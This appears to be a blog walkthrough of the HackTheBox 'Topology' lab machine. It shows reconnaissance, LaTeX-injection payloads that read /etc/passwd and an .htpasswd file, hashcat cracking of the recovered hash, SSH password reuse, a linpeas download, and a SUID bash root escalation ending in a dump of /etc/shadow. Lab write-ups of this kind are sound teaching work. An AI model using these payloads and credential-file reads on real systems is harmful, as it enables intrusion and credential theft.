---
title: "HTB - Topology"
date: 2023-06-29T10:07:34+09:30
draft: false
---

[//]: # (Project: HTB Machine Writeups - Generated with Python3)  
[//]: # (Title: HTB Topology Writeup)  
[//]: # (Author: M4773L)  
[//]: # (Date: 27/06/2023 - 12:11 PM)  
[//]: # (Date_Modified: ) 
[//]: # (WEBSITE_URL: http://m4773l.github.io)
[//]: # (GITHUB_REPO_URL: https://github.com/M4773L)

# Topology
 
Topology is a machine on the HackTheBox platform that has been rated as easy. Enumerating the target we will discover a number of subdomains either hosting an applications or static site. We will get a foothold on the machine by injecting into a Latex (document preparation application) implementation which will include the contents of a local file in the resulting image. Privilege escalation is relatively straightforward, running Linpeas we will identify that we can launch a shell with the permissions changed at time of execution.  
<!--more-->  

![Machine Info Card](/blog/htb/machines/topology/img/topology.png)  
&nbsp;  

## Enumeration
**Target IP: 10.10.11.217**

#### Nmap

**TCP**  
*Aggressive*  
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ nmap -A 10.10.11.217                                                
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-27 12:12 ACST
Nmap scan report for 10.10.11.217
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```  
As usual I will begin with a quick Nmap 'Aggressive' scan to identify open TCP ports with services listening, the default Nmap scripting engine scripts will be run against the identified services. The scan returned 2 results port 22 running OpenSSH and port 80 listening with an Apache2 HTTP server.  
&nbsp;  

*Connect*  
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ nmap -sTV -p- 10.10.11.217                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-27 12:12 ACST
Nmap scan report for 10.10.11.217
Host is up (0.038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.46 seconds
```
A TCP connect scan across the whole port range returns the same ports as the initial aggressive scan.  
&nbsp;  

**UDP**  
*Top 1000 Ports*  
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ sudo nmap -sUV --top-ports 1000 10.10.11.217
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-27 12:11 ACST
Nmap scan report for topology.htb (10.10.11.217)
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1188.24 seconds
```  
An Nmap UDP scan of the top 1000 ports returns 2 potential services, port 68 the DHCP service and port 5353 for Zeroconf.  
&nbsp;  

## Port 80 - HTTP

![Homepage](/blog/htb/machines/topology/img/homepage_1.jpg)  
![Homepage](/blog/htb/machines/topology/img/homepage_2.jpg)  
Takina a look at the site on port 80 and we are greeted with a website for the Topology group of Professor Lilian Klein from Miskatonic university. The website is largely static with a variety of information including members of staff, software projects and publications.  
&nbsp;  

**Page-Source**  

```html
<h2 class="w3-text-grey"><i class="w3-margin-right"></i>Software projects</h2>
          <div class="w3-container">

            <p>• <a href="http://latex.topology.htb/equation.php">LaTeX Equation Generator</a> - create .PNGs of LaTeX
              equations in your browser</p>
            <p>• PHPMyRefDB - web application to manage journal citations, with BibTeX support! (currenty in
              development)</p>
            <p>• TopoMisk - Topology tool suite by L. Klein and V. Daisley. Download link upon request.</p>
            <p>• PlotoTopo - A collection of Gnuplot scripts to aide in visualization of topoligical problems. Legacy, source code
              upon request.</p>
          </div>

```
Taking a look through the page-source and there is a subdomain hyperlinked for the Latex Equation Generator software project. Now that we have identified the root domain aswell as the existence of a subdomain, lets fuzz for more.  
&nbsp;  

**Add Target Domain(s) to '/etc/hosts'**
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ sudo vim /etc/hosts

```
Open the hosts file with the text editor of choice.  

```
10.10.11.217    topology.htb latex.topology.htb
```
Add the target machines IP address and the domains we identified.  
&nbsp;  

**Subdomain Fuzzing**  

```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://topology.htb/ -H "Host: FUZZ.topology.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 6767
 :: Filter           : Response words: 1612
 :: Filter           : Response lines: 175
________________________________________________

stats                   [Status: 200, Size: 108, Words: 5, Lines: 6]
dev                     [Status: 401, Size: 463, Words: 42, Lines: 15]
:: Progress: [19966/19966] :: Job [1/1] :: 12 req/sec :: Duration: [0:18:41] :: Errors: 0 ::

```
Fuzzing for further subdomains yields 2 additional hosts configured on the target.  
&nbsp;  

**Add Additional Subdomains to '/etc/hosts'**
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ sudo vim /etc/hosts

```
Once again open the hosts file with the text editor of choice.  

```
10.10.11.217    topology.htb latex.topology.htb stats.topology.htb dev.topology.htb

```
Add the additional subdomains we identified from the fuzzing.  
&nbsp;  

**BurpSuite**  

![Burp Scope](/blog/htb/machines/topology/img/burp_scope.jpg)  
Add the root domain and 3 subdomains we identified to the target scope in Burpsuite.  
&nbsp;  

**Web Browser**  

*http://latex.topology.htb*  

![Latex Home](/blog/htb/machines/topology/img/latex_home.jpg)  
Navigating to the Latex subdomain in the web browser, we are greeted with a PHP application that incorporates Latex to create "good-looking" mathematical equations as PNG image files. There is a form which accepts Latex inline math mode syntax with only support for one-line statements at the moment.  

![Latex Test Functionality](/blog/htb/machines/topology/img/latex_test_1.jpg)  
Testing the functionality of the application, I will simply use a modified version of the provided square root example.  

![Latex Test Functionality Result](/blog/htb/machines/topology/img/latex_test_2.jpg)  
After a few seconds we are redirected to the generated image file, with the nicely generated mathematical equation present.  
&nbsp;  

*http://stats.topology.htb*  

![Stats Home](/blog/htb/machines/topology/img/stats_home.jpg)  
The stats subdomain renders a simple server load graph.  

```html
<center>
	<p><img src="files/network.png" /></p>
	<p>---</p>
	<p><img src="files/load.png" /></p>
</center>
```  
Looking at the page source it simply loads 2 image files, 'network.png' cannot be displayed because it contains errors and load.png is the server load graph.  
&nbsp;  

*http://dev.topology.htb*  

![Dev Login](/blog/htb/machines/topology/img/dev_login.jpg)  
The dev subdomain prompts us with a login dialog requiring a username and password.  

![Dev Unauthorised](/blog/htb/machines/topology/img/dev_unauth.jpg)   
Clicking cancel on the login box returns an Unauthorized error due to the wrong credentials. We can also see that the server is running Apache/2.4.41 (Ubuntu).  
&nbsp;  

## Foothold
Searching online for Latex command injections and in the results is an entry for [HackTricks](https://book.hacktricks.xyz/), having a read through the various techniques suggested and hopefully we can read files on the target and have the contents returned in the resulting PNG image.  

![Hacktricks - Latex Injection](/blog/htb/machines/topology/img/hacktricks_latex.jpg)  
The site provides various examples of Latex injections we can use to read local files on the target.  
[HackTricks - Latex Injection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection)  
&nbsp;  

**Testing**  

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_1.jpg)  
Trying the first payload from the list to read the contents of '/etc/passwd'.  Payload: ```\input{/etc/passwd}```  

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_2.jpg)  
As you can see in the response there is some form of input validation checking whether we are injecting "illegal" commands.  
&nbsp;  

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_3.jpg)  
Trying different payloads from the list, I have success with the 'lsinputlisting' function from the Latex Listings package, the function is used to import code or text directly from the source file.  Payload: ```\lstinputlisting{/etc/passwd}```   

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_4.jpg)  
Rather than the application returning an image containing the "Illegal command detected", the app returns "Cannot be displayed because it contains errors" as text in the browser. This looks promising...  
&nbsp;  

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_5.jpg)  
After some searching online for Latex inline math syntax I identified that by enclosing the payload in '$' it may be correctly interpreted by the application.  

![Latex Injection Test](/blog/htb/machines/topology/img/latex_inject_test_6.jpg)  
Finally success! We have read the contents of the '/etc/passwd' file and the contents have been returned in the resulting PNG file. I will retreive a copy to my virtual machine.  Payload: ```$\lstinputlisting{/etc/passwd}$```
&nbsp;  


#### Plan
Now that I have idenitified the local file inclusion vulnerability in the developers implementation of the Latex application, I will proceed to read the applications configuration. Of particular interest is the Apache2 configuration files for the 'dev' subdomain.  

**Apache2**  

*HTAccess*  
![Latex Injection .HTAccess](/blog/htb/machines/topology/img/apache_htaccess_1.jpg)  
Attempting to read the '.htaccess' the configuration file that is responsible for controlling authorised access in Apache2.  
Payload: ```$\lstinputlisting{/var/www/dev/.htaccess}$```  

![Latex Injection .HTAccess](/blog/htb/machines/topology/img/apache_htaccess_2.jpg)  
From the resulting image we can see that there is an '.htpasswd' file also present in the same directory, it should contain atleast a username and a hash.   
&nbsp;  

*HTPasswd*  
![Latex Injection .HTPasswd](/blog/htb/machines/topology/img/apache_htpasswd_1.jpg)  
Reading the '.htpasswd' using the LFI vulnerability.  
Payload: ```$\lstinputlisting{/var/www/dev/.htpasswd}$```  

![Latex Injection .HTPasswd](/blog/htb/machines/topology/img/apache_htpasswd_2.jpg)  
The resulting image contains a username and password hash, lets attempt to crack the hash.  
&nbsp;  

**Password Hash**  

```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ echo '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > hash.txt 
                                                                                                                                                                                                                                             
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ cat hash.txt  
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

```
Using echo I will add the password hash to a file conveniently named 'hash.txt', I cat the contents of the file to the terminal just to verify the contents. The hash starts with '$apr1$' which indicates it is an MD5 hash. 
&nbsp;  

```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz, 1428/2921 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

....
SNIP
....

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 5 secs

....
SNIP
....

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
Time.Started.....: Tue Jun 27 09:16:16 2023 (3 mins, 12 secs)
Time.Estimated...: Tue Jun 27 09:19:28 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5236 H/s (11.07ms) @ Accel:128 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 997376/14344385 (6.95%)
Rejected.........: 0/997376 (0.00%)
Restore.Point....: 996864/14344385 (6.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#1....: cam1023 -> cajun3
Hardware.Mon.#1..: Util: 88%

Started: Tue Jun 27 09:14:51 2023
Stopped: Tue Jun 27 09:19:30 2023

```
Using Hashcat in mode 1600 (md5apr1, MD5(APR), Apache MD5), I will use the famous 'rockyou.txt' list of passwords to attempmt to crack the hash. After about 5 minutes we have a match: ```$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20``` 
&nbsp; 

*Dev Subdomain Login*
![Dev Login](/blog/htb/machines/topology/img/dev_login_2.jpg)  
Attempting to login to the 'dev' subdomain is successful using our newly obtained credentials.  

![Dev Login](/blog/htb/machines/topology/img/dev_login_3.jpg)  
Unfortunately for us we are greeted with a static site with nothing really useful there, lets try for password reusage.  
&nbsp;  

## Privilege Escalation - User

**Password Reusage**  

```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ ssh vdaisley@10.10.11.217
vdaisley@10.10.11.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jun 26 20:59:56 2023 from 10.10.14.22
-bash-5.0$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
-bash-5.0$ pwd
/home/vdaisley
-bash-5.0$ ls -la
total 36
drwxr-xr-x 5 vdaisley vdaisley 4096 Jun 26 14:32 .
drwxr-xr-x 3 root     root     4096 May 19 13:04 ..
lrwxrwxrwx 1 root     root        9 Mar 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 vdaisley vdaisley  220 Jan 17 12:26 .bash_logout
-rw-r--r-- 1 vdaisley vdaisley 3771 Jan 17 12:26 .bashrc
drwx------ 2 vdaisley vdaisley 4096 May 19 13:04 .cache
drwx------ 3 vdaisley vdaisley 4096 May 19 13:04 .config
drwx------ 3 vdaisley vdaisley 4096 Jun 26 21:05 .gnupg
-rw-r--r-- 1 vdaisley vdaisley  807 Jan 17 12:26 .profile
-rw-r----- 1 root     vdaisley   33 Jun 26 14:17 user.txt
```
Testing for password reusage proves fruitful as we are able to SSH into the target as user 'pdaisley' using the password we obtained from the hash.  
&nbsp;  

## Privilege Escalation - Root

```
-bash-5.0$ sudo -l
[sudo] password for vdaisley: 
Sorry, user vdaisley may not run sudo on topology.
-bash-5.0$ crontab -l
no crontab for vdaisley
```  
Testing if we can run any commands as 'sudo' or any cronjobs for our current user.  
&nbsp;  

**Linpeas**  
```
┌──(matt㉿HackTheBoxKali)-[~/Topology]
└─$ python3 -m http.server 8010                     
Serving HTTP on 0.0.0.0 port 8010 (http://0.0.0.0:8010/) ...
10.10.11.217 - - [27/Jun/2023 19:17:25] "GET /linpeas.sh HTTP/1.1" 200 -
```
Using a Python3 simple HTTP server I will host the file on my virtual machine.  
&nbsp;  

```
-bash-5.0$ wget http://10.10.14.22:8010/linpeas.sh
--2023-06-27 05:47:24--  http://10.10.14.22:8010/linpeas.sh
Connecting to 10.10.14.22:8010... connected.
HTTP request sent, awaiting response... 200 OK
Length: 835306 (816K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                  100%[========================================================================================================================================>] 815.73K  1.04MB/s    in 0.8s    

2023-06-27 05:47:25 (1.04 MB/s) - ‘linpeas.sh’ saved [835306/835306]

-bash-5.0$ chmod +x linpeas.sh 
```
Retrieving 'Linpeas.sh' to the target using ```wget``` and giving the file executable permissions with ```chmod +x```.
&nbsp;  

```
-bash-5.0$ ./linpeas.sh 
....
SNIP
....
 /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/                                                                                                                                                      
          linpeas-ng by carlospolop 
....
SNIP
....
LEGEND:                                                                                                                                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
....
SNIP
....
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                           
                      ╚════════════════════════════════════╝                                                                                                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                             
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                                                                  
-rwsr-xr-x 1 root root 463K Apr  3 18:47 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 163K Apr  4 07:56 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash                         <--- This entry is coloured RED/YELLOW  
-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10

```
Running [Linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) on the target one result in the SUID results, the line ```-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash ``` is coloured red/yellow which from the legend at the top of the script indicates it is highly likely a privilege escalation vector. Looking at the permission bits ```-rwsr-xr-x``` the 's' indicates that the bits will be set at execution.  
&nbsp;  

## Root
```
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
bash-5.0# cat /root/root.txt 
a88db384254fd3e17*************

```  
Lets simply run ```/usr/bin/bash -p```, checking the user permissions with the ```id``` command and you can see that the effective user ID that was set at time of execution is ```euid=0(root)```. Lets read the root flag!  
&nbsp;  

*/etc/shadow*  
```
bash-5.0# cat /etc/shadow
root:$6$P153wNg6DwlTSIv0$QFutCIjQWlJM24O6vyD5aoRv7kyvivOykonMDItV8rSqKpznqsmxfK7L51il6V7yF75qHE.Hkv6YLK25TSEle1:19496:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
mysql:!:18859:0:99999:7:::
tss:*:18859:0:99999:7:::
uuidd:*:18859:0:99999:7:::
sshd:*:18859:0:99999:7:::
pollinate:*:18859:0:99999:7:::
systemd-coredump:!!:18859::::::
vdaisley:$6$gRnKXcAaVVjMGjaY$PuuHK2.WUsdjSd/0ife.Arm05hBBZSZUNTGBrojnvRS4zrvV3prcBac4nOH0Id.7bArqL7QtqAAICTs0fQ2Al0:19063:0:99999:7:::
rtkit:*:19230:0:99999:7:::
dnsmasq:*:19230:0:99999:7:::
cups-pk-helper:*:19230:0:99999:7:::
usbmux:*:19230:0:99999:7:::
avahi:*:19230:0:99999:7:::
geoclue:*:19230:0:99999:7:::
saned:*:19230:0:99999:7:::
colord:*:19230:0:99999:7:::
pulse:*:19230:0:99999:7:::
gdm:*:19230:0:99999:7:::
fwupd-refresh:*:19375:0:99999:7:::
_laurel:!:19496::::::

```
Contents of the ```/etc/shadow``` file comntaining users and password hashes.  
&nbsp;
